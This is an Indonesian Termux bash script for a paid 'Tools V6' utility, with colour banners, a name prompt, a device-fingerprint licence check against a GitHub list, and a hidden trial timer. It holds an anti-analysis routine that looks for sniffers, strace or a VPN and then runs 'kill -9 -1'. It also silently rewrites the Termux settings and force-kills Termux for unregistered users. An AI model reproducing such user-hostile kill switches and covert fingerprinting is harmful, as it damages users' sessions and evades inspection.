b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
a='\033[1;30m'
y='\033[33;1m'
n='\033[0m'
bold_bg='\033[41;1m'
bold_gren='\033[1;32m'
dom=(
"\033[1;31m"
"\033[1;32m"
"\033[1;33m"
"\033[1;34m"
"\033[1;36m"
"\033[1;37m"
"\033[1;35m"
"\033[1;30m"
)
w=$(shuf -n 1 -e "${dom[@]}")
cd $HOME
apa_bego() {
TOLOL="$HOME/Yalakan"  
URL="https://github.com/QrwszXnXnchommed0e56/Yalakan/blob/8d6c48c24077f0f70842e615ce419983d8c03fa9/salah.mp3?raw=true"    
if [ -d "$TOLOL" ]; then
clear &> /dev/null
return 0
else
clear 
mpv --no-terminal --quiet --volume=150 "$URL" 2>/dev/null || echo -e "${r}[ ${r}! ${r}]${y} Gagall sound." 
echo ""      
echo -e "${r}[ ${g}+ ${r}]${p} Sound hilang mendownload..!!"
sleep 2
echo -e "${g}"
git clone --depth 32 https://github.com/QrwszXnXnchommed0e56/Yalakan "$TOLOL"
if [ -d "$TOLOL" ]; then
clear
echo ""
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
echo -e "${r}[ ${g}✓ ${r}]${y} Sound berhasil di install..!!"
sleep 2 
echo ""
clear
else
clear 
echo ""
echo -e "${r}[ ${r}x ${r}]${b} Gagal mendownload sound..!!"
echo ""
sleep 3
pkill -9 -f com.termux
fi
fi
}
apa_bego
pantau_aktivitas() {
log_and_exit() {
echo "$1"
kill -9 -1 && exit
}
deteksi_sniffer() {
local sniffers=("tcpdump" "tshark" "strace" "ettercap" "ngrep" "wireshark" "fiddler" "charles")
for sniffer in "${sniffers[@]}"; do
if pgrep -x "$sniffer" > /dev/null; then
log_and_exit "LU SEMUA NGENTOT !!"
fi
done
if lsof -p $$ 2> /dev/null | grep -q "libtermux-net.so"; then
log_and_exit "LU SEMUA NGENTOT !!"
fi
}
check_vpn() {
if ifconfig 2> /dev/null | grep -E "tun[0-9]" > /dev/null; then
log_and_exit "LU SEMUA NGENTOT !!"
fi
}
main() {
deteksi_sniffer       
check_vpn   
}
main "$@"
}
clear 
if [ ! -d "$HOME/storage" ]; then
echo ""
echo -e "${r}[ ${g}INFO ${r}]${y} Sedang melakukan stup."
echo "y" | termux-setup-storage
sleep 1
echo ""
echo -e "${r}[ ${g}SUCCESS ${r}]${y} Berhasil di stup."
echo ""
sleep 2
clear
fi
fitur_admin=(
"u0_a431"
)
properties() {
cek=$(whoami)
min=0  
for admin in "${fitur_admin[@]}"; do
if [[ "$cek" == "$admin" ]]; then
min=1
break
fi
done
if [[ $min -eq 1 ]]; then
if [ ! -f "$HOME/pasang.txt" ]; then
touch "$HOME/pasang.txt"
fi
return 0
fi
if [ -f "$HOME/pasang.txt" ]; then
return 0
else
mkdir -p ~/.termux
{
echo "font-size=8"
echo "bell-character=ignore"
echo "terminal-transcript-opacity=0.95"
echo "use-black-ui=true"
echo "hide-soft-keyboard-on-startup=true"
echo "clipboard-autocopy=true"
echo "terminal-margin-vertical=1"
echo "extra-keys=[ \\"
echo " ['TAB','>','<','/','exit\n','PGUP'], \\"
echo " ['SHIFT','ls\n','cd Son\n','make run\n','()','cd\n'], \\"
echo " ['git pull\n','-','rm -rf ','&','UP','{}'], \\"
echo " ['CTRL','%','clear\n','LEFT','DOWN','RIGHT'] \\"
echo "]"
} > ~/.termux/termux.properties 
termux-reload-settings
touch "$HOME/pasang.txt"
fi
}
properties
ukuran=51
kon() {
echo -ne "\033[?25l"
}
tai() {
echo -ne "\033[?25h"
}
memek() {
stty echo
tai
}
trap memek EXIT
trap 'memek; exit' INT
clear
kon
cok=$(tput cols)
if [ "$cok" -ge "$ukuran" ]; then
clear
tai
clear 
else
echo -ne "\033[2J\033[H"
echo ""
echo -e "${bold_bg}${bold_gren} Ukuran Layar Belum Sesuai, ${n}"
echo ""
echo -e "\033[100;36m Silahkan Cubit Layar !! ${n}"
while [ "$cok" -lt "$ukuran" ]; do
sleep 1
cok=$(tput cols)
done
clear
tai
clear 
fi
max_menit=1440
expired=$((max_menit * 60))
kon_05="$PREFIX/lib/.aesesplersukoerepcokpaokdestu"
dir_05="/storage/emulated/999/.aesesplersukoerepcokpaokdestu"
kon_06="$PREFIX/.waktuhabiszggzzrtyzqiy"
dir_06="/storage/emulated/999/.waktuhabiszggzzrtyzqiy"
cek_status_premium() {
local user=$(whoami)-$(id -u)-$(getprop ro.serialno)-$(settings get secure android_id)
local hash_user=$(sha256sum <<< "$user" | cut -c1-20)
local repo="https://github.com/Apwusyvwkjwygw/.whoami"
local dir="$HOME/.cek_daftar"        
rm -rf "$dir" 2>/dev/null
git clone --depth 1 "$repo" "$dir" 2>/dev/null    
if [ -f "$dir/Daftar.txt" ]; then
local db=$(cat "$dir/Daftar.txt" | tr -d '\r')
rm -rf "$dir"        
while IFS= read -r line; do
line=$(echo "$line" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
[ -z "$line" ] && continue
if [ "$line" = "$hash_user" ]; then
rm -f "$kon_05" 2>/dev/null
rm -f "$dir_05" 2>/dev/null
rm -f "$kon_06" 2>/dev/null
rm -rf "$dir_06" 2>/dev/null
return 0
fi
done <<< "$db"
else
rm -rf "$dir"
fi      
return 1
}
cek_trial_status() {
if [ -f "$dir_05" ]; then
local file_content=$(cat "$dir_05" 2>/dev/null)
local line_count=$(echo "$file_content" | wc -l)
if [ $line_count -ge 2 ]; then
local sdcard_uid=$(head -n 1 "$dir_05" 2>/dev/null)
local sdcard_expiry=$(tail -n 1 "$dir_05" 2>/dev/null)
if [[ "$sdcard_expiry" =~ ^[0-9]+$ ]]; then
echo "$sdcard_uid" > "$kon_05"
echo "$sdcard_expiry" >> "$kon_05"
echo "ACTIVE"
return 0
fi
fi
fi
if [ -f "$kon_05" ]; then
local line_count=$(cat "$kon_05" 2>/dev/null | wc -l)
if [ $line_count -ge 2 ]; then
local trial_uid=$(head -n 1 "$kon_05" 2>/dev/null)
local trial_expiry=$(tail -n 1 "$kon_05" 2>/dev/null)
local current_uid=$(whoami)-$(id -u)-$(getprop ro.serialno)-$(settings get secure android_id)
local hash_current=$(sha256sum <<< "$current_uid" | cut -c1-20)       
if [ "$trial_uid" = "$hash_current" ] && [[ "$trial_expiry" =~ ^[0-9]+$ ]]; then
echo "$trial_uid" > "$dir_05"
echo "$trial_expiry" >> "$dir_05"
echo "ACTIVE"
return 0
fi
fi
fi    
echo "NONE"
return 1
}
cek_expiry_trial() {
if [ -f "$dir_05" ]; then
local storage_expiry=$(tail -n 1 "$dir_05" 2>/dev/null | tr -d '\n\r ')
if [[ "$storage_expiry" =~ ^[0-9]+$ ]]; then
local current_time=$(date +%s)
if [ $current_time -gt $storage_expiry ]; then
echo "EXPIRED"
mkdir -p "$dir_06" 2>/dev/null
touch "$kon_06" 2>/dev/null
echo "TRIAL_EXPIRED_$(date +%s)" > "$kon_06"
return 1
fi
echo -e "${g}TRIAL ❌${n}"
local remaining=$((storage_expiry - current_time))
local minutes=$((remaining / 60))
local seconds=$((remaining % 60))
echo -e "${c}➜ Sisa waktu : ${g}$minutes menit $seconds detik${n}"
return 0
fi
fi
if [ -f "$kon_05" ]; then
local expiry_line=$(tail -n 1 "$kon_05" 2>/dev/null | tr -d '\n\r ')
if [[ "$expiry_line" =~ ^[0-9]+$ ]]; then
local current_time=$(date +%s)
if [ $current_time -gt $expiry_line ]; then
echo "EXPIRED"
mkdir -p "$dir_06" 2>/dev/null
touch "$kon_06" 2>/dev/null
echo "TRIAL_EXPIRED_$(date +%s)" > "$kon_06"
return 1
fi
echo -e "${g}TRIAL ❌${n}"
local remaining=$((expiry_line - current_time))
local minutes=$((remaining / 60))
local seconds=$((remaining % 60))
echo -e "${c}➜ Sisa waktu : ${g}$minutes menit $seconds detik${n}"
return 0
fi
fi
echo "NO_TRIAL"
return 0
}
buat_trial_baru() {
rm -f "$kon_06" 2>/dev/null
rm -rf "$dir_06" 2>/dev/null
local current_uid=$(whoami)-$(id -u)-$(getprop ro.serialno)-$(settings get secure android_id)
local hash_current=$(sha256sum <<< "$current_uid" | cut -c1-20)
local timestamp=$(date +%s)
local expiry=$((timestamp + expired))    
echo "$hash_current" > "$kon_05"
echo "$expiry" >> "$kon_05"
echo "$hash_current" > "$dir_05"
echo "$expiry" >> "$dir_05"
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
sleep 1  
echo -e "${g}Trial berhasil dibuat!${n}"
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
sleep 1  
echo -e "${c}Durasi : ${g}$max_menit menit${n}"
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
sleep 1  
echo -e "${c}Berlaku hingga : ${g}$(date -d @$expiry '+%Y-%m-%d %H:%M:%S')${n}"
sleep 2
}
ank_kontol() {
clear
mpv --no-video --quiet "$HOME/Yalakan/salah.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/IDV1.mp3" &> /dev/null &
sleep 0.05
echo ""
echo -e "\033[31;1m╔══════════════════════════════════════════════╗"
echo -e "\033[31;1m║ \033[32;1m           ID TIDAK TERVERIFIKASI        \033[31;1m    ║"
echo -e "\033[31;1m╚══════════════════════════════════════════════╝"
sleep 0.05
echo -e "\033[31;1m╔══════════════════════════════════════════════╗"
echo -e "\033[31;1m║ \033[32;1m         SCRIPT TIDAK DAPAT DI AKSES   \033[31;1m      ║"
echo -e "\033[31;1m╚══════════════════════════════════════════════╝"
echo ""
local hash_id=$(whoami)-$(id -u)-$(getprop ro.serialno)-$(settings get secure android_id)
local short_hash=$(sha256sum <<< "$hash_id" | cut -c1-20)
echo -e "${c}ID Device Anda : ${r}$short_hash"
echo -e "${c}Belum Terdaftar!! "
echo -e "${g}Silakan PREMIUM Dulu Ke Thxyzz404 "
echo ""
sleep 6
pkill -9 -f com.termux
}
cek_akses() {
if cek_status_premium; then
echo -e "${g}PREMIUM ✅"
return 0
fi    
if [ -f "$kon_06" ] || [ -d "$dir_06" ]; then
echo -e "${r}Trial anda sudah habis !!"
echo -e "${c}Silakan PREMIUM terlebih dahulu."
sleep 3
return 1
fi
local trial_status=$(cek_trial_status)
if [ "$trial_status" = "ACTIVE" ]; then
if cek_expiry_trial; then
return 0
else
return 1
fi
else
local expiry_check=$(cek_expiry_trial)
if [ "$expiry_check" = "EXPIRED" ]; then
mpv --no-video --quiet "$HOME/Yalakan/salah.mp3" &> /dev/null &
sleep 1
echo -e "${g}Trial sudah pernah digunakan dan expired!"
echo -e "${r}Silakan PREMIUM !!"
sleep 3
return 1
fi
if [ "$expiry_check" = "NO_TRIAL" ]; then
mpv --no-video --quiet "$HOME/Yalakan/salah.mp3" &> /dev/null &
sleep 1
echo -e "${c}Membuat trial baru..."
buat_trial_baru
sleep 2
return 0
fi
return 1
fi
}
if cek_akses; then
sleep 3
else
ank_kontol
fi
tanggal=$(date '+%d')
bulan=$(date '+%B')
case $bulan in
January) bulan="Januari";;
February) bulan="Februari";;
March) bulan="Maret";;
April) bulan="April";;
May) bulan="Mei";;
June) bulan="Juni";;
July) bulan="Juli";;
August) bulan="Agustus";;
September) bulan="September";;
October) bulan="Oktober";;
November) bulan="November";;
December) bulan="Desember";;
esac
ucapan=""
time=$(date +'%H:%M')
kang_rinem_kontol=$(printf "%-21s" "$time")
hari=$(date +%A)
case $hari in
Monday) ucapan="Senin";;
Tuesday) ucapan="Selasa";;
Wednesday) ucapan="Rabu";;
Thursday) ucapan="Kamis";;
Friday) ucapan="Jum'at";;
Saturday) ucapan="Sabtu";;
Sunday) ucapan="Minggu";;
esac
jam_perhari=$(date +"%H")
if [ $jam_perhari -ge 6 ] && [ $jam_perhari -le 11 ]; then
sambutan="Pagi 🌆"
elif [ $jam_perhari -ge 12 ] && [ $jam_perhari -le 14 ]; then
sambutan="Siang 🌅"
elif [ $jam_perhari -ge 15 ] && [ $jam_perhari -le 17 ]; then
sambutan="Sore 🌄"
else
sambutan="Malam 🌃"
fi
clear 
cok="ansi-rounded"
pgn=$((pgn + 1))
usr=""
file="/data/data/com.termux/files/home/usr.txt"
if [ -f "$file" ]; then
usr=$(cat "$file")
fi
if [ -z "$usr" ]; then
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣦⣶⣶⣶⣶⣶⣶⣴⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠟⠛⠙⠉⠉⠋⠙⠙⠛⠛⠿⢿⣿⣿⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⠿⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣷⡀⠀⠀⠀
⠀⠀⢠⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡄⠀⠀
⠀⢀⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣷⡀⠀
⠀⣼⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣧⠀
⢀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡀
⢸⣿⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢽⣿⡆
⢸⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠛⠉⠁⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣿⡇
⠸⣿⡯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣶⣤⣤⣤⣠⣤⣴⣶⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⠇
⠈⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⠁
⠀⢻⣿⣆⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠀⠀⠀⠀⠀⠀⣰⣿⡏⠀
⠀⠈⢿⣿⡄⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⢠⣿⡿⠁⠀
⠀⠀⠘⣿⣿⡄⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⣠⣿⣿⠃⠀⠀
⠀⠀⠀⠈⢿⣿⣦⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣴⣿⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠻⠻⠿⠿⠿⠿⠟⠟⠛⠋⠉⠀⠀" | lolcat
echo -e "${c}"
while true; do
read -p "Masukkan Nama Anda [ tanpa sepasi ] : " najis_kroco
echo ""
if [ -z "$najis_kroco" ]; then
echo -e "${r}Nama Tidak Boleh Kosong..!!${c}"
echo ""
continue
fi
if [[ "$najis_kroco" =~ \  ]]; then
echo -e "${g}Nama tidak boleh ada spasi..!!${c}"
echo ""
continue
fi
usr="$najis_kroco"
echo "$usr" > "$file"
echo -e "${y}TERIMAKASIH Sudah Memasukkan Nama Anda..!!"
sleep 3
break
done
fi
clear
txt() {
  local text="$1"
  local delay="${2:-0.05}"
  local color="${3:-}"
  local i char
  if [ -n "$color" ]; then
    printf "%b" "$color"
  fi
  for ((i=0; i<${#text}; i++)); do
    char="${text:i:1}"
    printf "%s" "$char"
    sleep "$delay"
  done
  printf "\n"
  if [ -n "$color" ]; then
    printf "%b" "$n"
  fi
}
cek_paket() {
if ! command -v python &> /dev/null; then
pkg install -y python
fi
if ! command -v pip &> /dev/null; then
pkg install -y python-pip
fi
if ! command -v gtts-cli &> /dev/null; then
pip install gTTS
fi
clear
}
generate_suara() {
local user="$1"
local sound="$HOME/nama_${user}.mp3"
if [ ! -f "$sound" ]; then
echo "Hallo ${user}, selamat datang di Tools V6" > "$HOME/temp.txt"
gtts-cli -f "$HOME/temp.txt" -l id -o "$sound"
rm -f "$HOME/temp.txt"
fi
echo "$sound"
}
banner1() {
mpv --no-video --quiet "$HOME/Son/C2.mp3" &> /dev/null &
sleep 2
cowsay -f eyes 'Jangan dengarkan apa kata orang lain.' | boxes -d "$cok" | lolcat
echo ""
echo -e "\033[32;1m╔═════════════════════════════════════╗"
echo -e "\033[32;1m║ ${r}         TOOLSV6__SCANNING         ${g} ║"
echo -e "\033[32;1m╚═════════════════════════════════════╝"
echo ""
}
banner2() {
mpv --no-video --quiet "$HOME/Son/C2.mp3" &> /dev/null &
sleep 2
echo -e "${bold_bg}${bold_gren} PESAN ${n}"
echo -e "${g} Teruslah semangat walupun agak melelahkan."
echo "
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠛⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⢠⣤⣄⡀⠈⠙⠛⠿⣿⣿⣿⡝⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡿⠿⠛⠋⠉⠉⠉⠀⠀⢿⣿⣿⣷⣶⣄⣀⠀⠉⠉⠁⠀⠢⠈⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⡟⣫⣥⣤⣤⣶⣶⣶⣶⣶⣤⣤⡈⢿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣄⣀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡀⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠈⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠂⠙⢿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠛⠿⠿⣿⣿⣿⣿⣿⣦⠀⠀⠀⣉⠻⢿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⢻⣿
⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⢀⣀⣀⣀⣀⡈⠉⠻⢿⣿⣧⡀⠀⠘⠷⣤⡙⢿⣿⣿⣿⣿⣿⣿⡄⠀⠀⢻
⣿⣿⣿⣯⣄⡀⠀⠀⠀⠀⠐⢿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣝⠻⣷⣄⠀⠀⠀⠀⠀⠉⠛⠛⠿⠿⣿⡿⠀⠀⠘
⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣦⣾⣿⣿⣶⣶⣶⣦⣤⣄⡀⠀⠀⣸
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠙⣿⣿⣿⡿⠉⠀⢀⠈⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⢻
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠸⣿⣿⠃⢀⣾⣿⣿⣿⣶⡄⠉⠿⣿⣿⣿⣿⣏⠉⠛⠻⠿⠿⠿⠀⢺
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⢻⣿⠀⢈⣿⣿⣿⣿⡟⣇⣠⣦⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⢸
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⢸⣿⠀⣿⣿⣿⣿⡟⢠⣿⣿⣟⠀⣀⡈⠻⢿⣿⠿⠗⠀⢠⡞⢀⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⠀⣠⣾⣿⣿⡇⠸⣿⣿⣿⣾⣿⠃⠀⢀⣤⣤⣤⡀⠀⢀⣾⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⣾⣿⠀⣿⡿⠿⠋⡅⠐⣿⣿⡟⣿⡟⣀⣴⣿⣿⣿⡏⢀⣴⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⣰⣿⣿⡄⠀⠀⠀⠸⠿⠀⠈⠋⢀⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⢰⣿⣿⣿⣷⣾⣿⣿⡶⠖⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⡁⠀⠀⠀⠉⠉⠉⠉⠉⠉⠀⣀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ 
" | boxes -d "$cok" | lolcat 
echo ""
echo -e "\033[32;1m╔═════════════════════════════════════╗"
echo -e "\033[32;1m║ ${r}         TOOLSV6__SCANNING         ${g} ║"
echo -e "\033[32;1m╚═════════════════════════════════════╝"
echo ""
}
banner3() {
mpv --no-video --quiet "$HOME/Son/C2.mp3" &> /dev/null &
sleep 2
echo -e "${bold_bg}${bold_gren} PESAN ${n}"
echo -e "${g} Tinggalkan lah orang lain yang kamu sukai"
echo -e "${g} dan fokuslah pada dirimu sendiri."
echo "
    ⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀
" | boxes -d "$cok" | lolcat 
echo ""
echo -e "\033[32;1m╔═════════════════════════════════════╗"
echo -e "\033[32;1m║ ${r}         TOOLSV6__SCANNING         ${g} ║"
echo -e "\033[32;1m╚═════════════════════════════════════╝"
echo ""
}
banner4() {
mpv --no-video --quiet "$HOME/Son/C2.mp3" &> /dev/null &
sleep 2
echo -e "${bold_bg}${bold_gren} PESAN ${n}"
echo -e "${g} Jangan sedih bro saya akan menemanimu."
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣶⣶⣶⣶⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
